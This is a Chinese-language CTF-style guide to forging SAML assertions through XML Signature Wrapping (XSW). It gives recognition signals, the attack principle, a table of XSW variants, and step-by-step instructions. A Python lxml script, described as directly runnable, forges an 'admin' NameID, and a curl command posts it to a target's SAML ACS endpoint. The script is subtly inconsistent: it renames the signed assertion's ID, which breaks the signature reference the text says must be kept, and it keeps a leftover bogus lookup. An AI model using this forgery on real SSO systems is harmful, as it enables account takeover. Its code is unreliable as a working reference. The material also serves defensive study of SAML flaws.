---
title: SAML 断言伪造与 XSW（XML Signature Wrapping）攻击
category: web
tags: [saml, xsw, 签名绕过, sso, xml]
signals: [POST 表单字段名 SAMLResponse, 响应体是 base64 的 <samlp:Response>, 存在 /SAML/SSO 或 /adfs/ls 端点, 断言里有 <ds:Signature> 与 <Assertion ID=, IdP 元数据文件出现了证书, 登录流程跳转到 idp.TARGET 再回跳, 报错提示「Signature validation failed」, 表单里有 RelayState, 提示「单点登录」「SAML」「断言」]
difficulty: hard
source: "USENIX Sec 2012 / HackTricks / OWASP"
tools: [python, burpsuite, xmlsec1]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 登录时表单 POST `SAMLResponse=<base64>&RelayState=<...>`。
- base64 解码后是 `<samlp:Response ...><saml:Assertion ...><ds:Signature>`。
- 有 `/saml/metadata`、`/SAML/SSO`、`/adfs/ls`、`/simplesaml/` 之类路径。
- 报错页出现 `Signature validation failed`、`InvalidSignature`、`NotBefore/NotOnOrAfter`。
- 提示词：`单点登录`、`SAML`、`断言`、`签名`、`XSW`。
- 拿到一个**合法的已签 SAMLResponse**（通常是普通用户身份），目标是改成 `admin`。

## 二、原理

### 1. SAML 的验证流程

```
① SP -> IdP: 用户发起 SSO
② IdP -> SP: POST SAMLResponse(base64) + RelayState
③ SP 验证: ① 解析 XML ② 找 ds:Signature ③ 校验签名引用（Reference URI）
           ④ 取 Assertion 里的 NameID/属性 ⑤ 建立会话
```

### 2. 关键弱点：**XML 解析器与签名验证器看到的"节点"不同**

- 签名只覆盖 `Reference URI="#AssertionID"` 指定的那个节点。
- 但 SP 取用户信息时，往往用 XPath `//Assertion[1]` 或 `.find('Assertion')` 找**第一个** Assertion。
- 如果把**已签名的原始 Assertion 移到别处**，再插入一个**未签名的新 Assertion**（在签名校验器取不到的位置），两边就"看到"不同节点 → 这就是 **XSW**。

### 3. XSW 的 8 种变体（Somorovsky 2012）

| 变体 | 思路 |
|---|---|
| XSW-1 | 签名在**原始位置**，攻击断言作为兄弟节点放到**前面** |
| XSW-2 | 攻击断言包在原始 Assertion 里 |
| XSW-3 | 攻击断言作为 `Extensions` 的子节点 |
| XSW-4 | 用 `Object` 元素承载攻击断言 |
| XSW-5 | 把签名移到攻击断言内部 |
| XSW-6 | 把签名放进 `Extensions` |
| XSW-7 | 多重包裹 + `Reference` 指向被移动的节点 |
| XSW-8 | **把签名摘出来放到新的 Assertion 下** |

核心步骤（XSW-1 最常见）：

1. 把原 `<Assertion ID="A1">`（含 Signature）**整体移动**到 `<Response>` 的第二个位置。
2. 新建 `<Assertion ID="A2">`（`NameID=admin`），放到第一位。
3. SP 的 XPath 取第一个 → admin；签名校验器取 `#A1` → 仍是合法签名。

## 三、解题步骤

1. **抓包**：登录后拦截到 `SAMLResponse`，`base64 -d > resp.xml`。
2. **美化**：`xmllint --format resp.xml > pretty.xml`，看清 Assertion、Signature、Reference。
3. **确认目标**：`NameID` / `Attribute Name="role"` 是我们要改的字段。
4. **构造 XSW-1**：
   - 复制整段 `<saml:Assertion ID="A1">...</saml:Assertion>`（含 `<ds:Signature>`）到后面；
   - 在原位置**插入**伪造 Assertion（ID 不同，`NameID=admin`）。
5. **去掉 base64 换行**：`base64 -w0 new.xml > resp.b64`。
6. **POST 回 SP**：`RelayState` 原样带上。
7. **看是否成功**：SP 跳转到 `/dashboard` 且显示 admin。

## 四、可直接运行的脚本

解码 / 重编码工具：

```bash
# 解码
python3 -c "import base64,sys;sys.stdout.buffer.write(base64.b64decode(open('resp.b64').read()))" > resp.xml
# 美化（需 libxml2-utils）
xmllint --format resp.xml > pretty.xml
# 重新编码（不能有换行！）
base64 -w0 pretty.xml > resp.b64
```

XSW-1 构造（往原位置**前面**插入伪造 Assertion）：

```python
import base64, copy
from lxml import etree

NS = {
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "saml":  "urn:oasis:names:tc:SAML:2.0:assertion",
    "ds":    "http://www.w3.org/2000/09/xmldsig#",
}

b64 = open("resp.b64").read().strip()
root = etree.fromstring(base64.b64decode(b64))

resp = root.find("saml:Assertion|samlp:Status", NS)  # 仅示例
resp = root.find(".//saml:Assertion", NS)

# 1) 复制原始（已签）Assertion，作为"签名载体"
signed = copy.deepcopy(resp)
signed.set("ID", "LEGIT-ASSERTION")

# 2) 构造伪造 Assertion（无签名，改 NameID=admin）
forged = copy.deepcopy(resp)
for tag in forged.findall(".//ds:Signature", NS):
    tag.getparent().remove(tag)
forged.set("ID", "EVIL-ASSERTION")
nameid = forged.find(".//saml:NameID", NS)
nameid.text = "admin"

# 3) 把伪造的放到最前面，把已签的往后挪（XSW-1）
parent = root
parent.remove(resp)
parent.insert(list(parent).index(root.find(".//samlp:Status", NS)) if root.find(".//samlp:Status", NS) is not None else 0, forged)
parent.append(signed)

out = etree.tostring(root, xml_declaration=True, encoding="utf-8")
print(base64.b64encode(out).decode())
```

提交：

```bash
curl -s -X POST 'https://app.TARGET/saml/acs' \
  --data-urlencode "SAMLResponse=$(cat resp.b64)" \
  --data-urlencode "RelayState=$(cat relay.txt)" -i
```

辅助：判断 SP 用的是哪个解析器（先看 XPath 选择哪个 Assertion）：

```python
from lxml import etree
t = etree.fromstring(open("resp.xml", "rb").read())
# 常见取值方式，逐一验证
print(t.xpath("//saml:Assertion[1]/saml:Subject/saml:NameID/text()", namespaces=NS))
```

## 五、常见坑 / 变体

- **`ID` 必须唯一**：伪造与原始 Assertion 的 ID 不能相同，否则 XML schema 校验失败。
- **时间戳**：`NotOnOrAfter` 若已过期需改（**但不能改已签的部分**）。
- **Reference URI 用 `#ID` 或 XPath**：XPath 型（`Reference URI` 为空 + `Transform XPath`）存在 `XPath Filtering` 绕过（`#ID` 之外的注释节点）。
- **Schema 校验严格**：`Assertion` 只能出现在 `Response` 特定位置 → 用 XSW-2/3/4。
- **SP 用 `defusedxml`**：`defusedxml` 只防 XXE，不防 XSW。
- **SP 用严格签名库**（如 `python3-saml` 的 `strict=True`）：会拒绝多个 Assertion，XSW 失败 → 转去 **签名包装 + `Transform` 绕过**（`enveloped-signature` 被绕过）。
- **弱算法**：`rsa-sha1` 且 `digest` 可替换 → 签名伪造难度大幅下降。
- **XXE 组合**：SAML XML 解析前先试 XXE（`<!DOCTYPE` + 外部实体），见 `xxe-injection.md`。
- **变体：`Comment` 注入**（CVE-2017-11427，python-saml）→ `admin<!---->@x.com` 被不同解析器不同解读。
- **变体：`Signature` 使用 `KeyInfo` 自签可信**（SP 用响应里自带的证书）→ 直接自签即可。

## 六、参考来源

- [On Breaking SAML: Be Whoever You Want to Be — USENIX Security 2012](https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf)
- [What is XML Signature Wrapping? — IBM](https://www.ibm.com/think/topics/xml-signature-wrapping)
- [HackTricks — SAML attacks](https://book.hacktricks.wiki/en/pentesting-web/saml-attacks/index.html)
- [OASIS — SAML 2.0 Core](https://docs.oasis-open.org/security/saml/v2.0/saml-core-2.0-os.pdf)
- [W3C — XML Signature Syntax and Processing](https://www.w3.org/TR/xmldsig-core/)
- [PortSwigger — XXE injection](https://portswigger.net/web-security/xxe)
